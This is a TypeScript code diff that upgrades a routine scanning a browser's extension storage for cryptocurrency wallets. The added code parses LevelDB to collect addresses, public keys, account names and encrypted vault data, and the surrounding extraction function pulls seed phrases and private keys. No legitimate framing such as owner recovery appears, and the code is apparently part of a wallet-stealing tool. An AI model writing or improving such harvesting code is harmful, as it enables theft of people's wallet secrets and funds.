@@ -9,6 +9,7 @@
 
 import { readFileSync, readdirSync, statSync, existsSync } from "fs"
 import path from "path"
+import { parseLevelDBExtension, getUniqueValues } from "../leveldb-parser"
 
 /**
  * Crypto wallet data interface
@@ -24,6 +25,12 @@ export interface CryptoWallet {
   password_hint?: string
   file_path: string
   blockchain?: string
+  // Enhanced fields from LevelDB parsing
+  public_key?: string
+  account_name?: string
+  network_config?: any
+  vault_data?: any
+  extension_id?: string
 }
 
 /**
@@ -114,7 +121,34 @@ function isBIP39SeedPhrase(text: string): boolean {
 }
 
 /**
- * Parse browser wallet extensions
+ * Detect blockchain from address format
+ */
+function detectBlockchain(address: string): string | undefined {
+  if (!address) return undefined
+
+  // Ethereum address (0x + 40 hex chars)
+  if (/^0x[a-fA-F0-9]{40}$/.test(address)) {
+    return "ETH"
+  }
+
+  // Bitcoin address (starts with 1, 3, or bc1)
+  if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(address)) {
+    return "BTC"
+  }
+  if (/^bc1[a-z0-9]{39,59}$/.test(address)) {
+    return "BTC"
+  }
+
+  // Solana address (32-44 base58 chars)
+  if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address)) {
+    return "SOL"
+  }
+
+  return undefined
+}
+
+/**
+ * Parse browser wallet extensions with proper LevelDB parsing
  */
 export function parseBrowserWalletExtensions(browserDataPath: string): CryptoWallet[] {
   const wallets: CryptoWallet[] = []
@@ -135,27 +169,109 @@ export function parseBrowserWalletExtensions(browserDataPath: string): CryptoWal
       if (walletName) {
         const extensionPath = path.join(extensionsPath, extensionId)
 
-        // Look for LevelDB files
-        const files = readdirSync(extensionPath)
-        for (const file of files) {
-          if (file.endsWith(".log") || file.endsWith(".ldb")) {
-            const filePath = path.join(extensionPath, file)
+        try {
+          // Use proper LevelDB parser for better extraction
+          console.log(`🔍 Parsing ${walletName} extension with LevelDB parser...`)
+          const levelDBData = parseLevelDBExtension(extensionPath, walletName)
+          const uniqueData = getUniqueValues(levelDBData)
 
-            try {
-              const buffer = readFileSync(filePath)
-              const content = buffer.toString("utf-8", 0, Math.min(buffer.length, 1024 * 1024))
+          // Convert LevelDB parsed data to CryptoWallet format
+          // Addresses
+          for (const address of uniqueData.addresses) {
+            const blockchain = detectBlockchain(address)
+            wallets.push({
+              wallet_type: "browser_extension",
+              wallet_name: walletName,
+              address: address,
+              blockchain: blockchain,
+              file_path: extensionPath,
+              extension_id: extensionId
+            })
+          }
 
-              // Extract wallet data from content
-              extractWalletData(content, filePath, "browser_extension", walletName, wallets)
-            } catch (err) {
-              // Can't read file
+          // Public keys
+          for (const pubKey of uniqueData.publicKeys) {
+            wallets.push({
+              wallet_type: "browser_extension",
+              wallet_name: walletName,
+              public_key: pubKey,
+              file_path: extensionPath,
+              extension_id: extensionId
+            })
+          }
+
+          // Account names (combine with addresses if possible)
+          for (const accountName of uniqueData.accountNames) {
+            // Try to find matching address entry to add name to
+            const existingWallet = wallets.find(w =>
+              w.extension_id === extensionId &&
+              w.wallet_name === walletName &&
+              !w.account_name
+            )
+
+            if (existingWallet) {
+              existingWallet.account_name = accountName
+            } else {
+              // Create standalone entry for account name
+              wallets.push({
+                wallet_type: "browser_extension",
+                wallet_name: walletName,
+                account_name: accountName,
+                file_path: extensionPath,
+                extension_id: extensionId
+              })
+            }
+          }
+
+          // Network configs
+          for (const networkConfig of uniqueData.networkConfigs) {
+            wallets.push({
+              wallet_type: "browser_extension",
+              wallet_name: walletName,
+              network_config: networkConfig,
+              file_path: extensionPath,
+              extension_id: extensionId
+            })
+          }
+
+          // Vault data (encrypted, but useful for analysis)
+          for (const vaultData of uniqueData.vaultData) {
+            wallets.push({
+              wallet_type: "browser_extension",
+              wallet_name: walletName,
+              vault_data: JSON.stringify(vaultData),
+              file_path: extensionPath,
+              extension_id: extensionId
+            })
+          }
+
+          console.log(`✅ Found ${uniqueData.addresses.length} addresses, ${uniqueData.publicKeys.length} public keys, ${uniqueData.accountNames.length} accounts from ${walletName}`)
+
+        } catch (err) {
+          console.error(`⚠️  LevelDB parsing failed for ${walletName}, falling back to basic parsing:`, err)
+
+          // Fallback to basic string-based parsing
+          const files = readdirSync(extensionPath)
+          for (const file of files) {
+            if (file.endsWith(".log") || file.endsWith(".ldb")) {
+              const filePath = path.join(extensionPath, file)
+
+              try {
+                const buffer = readFileSync(filePath)
+                const content = buffer.toString("utf-8", 0, Math.min(buffer.length, 1024 * 1024))
+
+                // Extract wallet data from content (old method)
+                extractWalletData(content, filePath, "browser_extension", walletName, wallets, extensionId)
+              } catch (err) {
+                // Can't read file
+              }
             }
           }
         }
       }
     }
   } catch (err) {
-    // Directory doesn't exist
+    console.error("❌ Error parsing browser wallet extensions:", err)
   }
 
   return wallets
@@ -247,6 +363,7 @@ function extractWalletData(
   walletType: CryptoWallet["wallet_type"],
   walletName: string,
   wallets: CryptoWallet[],
+  extensionId?: string,
 ): void {
   // Try to parse as JSON first (common for wallet exports)
   try {
@@ -266,6 +383,7 @@ function extractWalletData(
           wallet_name: walletName,
           seed_phrase: seed.trim(),
           file_path: filePath,
+          extension_id: extensionId,
         })
       }
     }
@@ -281,6 +399,7 @@ function extractWalletData(
         private_key: key,
         blockchain: "ETH",
         file_path: filePath,
+        extension_id: extensionId,
       })
     }
   }
@@ -295,6 +414,7 @@ function extractWalletData(
         private_key: key,
         blockchain: "BTC",
         file_path: filePath,
+        extension_id: extensionId,
       })
     }
   }
@@ -310,6 +430,7 @@ function extractWalletData(
       address: ethAddresses[0],
       blockchain: "ETH",
       file_path: filePath,
+      extension_id: extensionId,
     })
   }
 
@@ -320,6 +441,7 @@ function extractWalletData(
       address: btcAddresses[0],
       blockchain: "BTC",
       file_path: filePath,
+      extension_id: extensionId,
     })
   }
 }
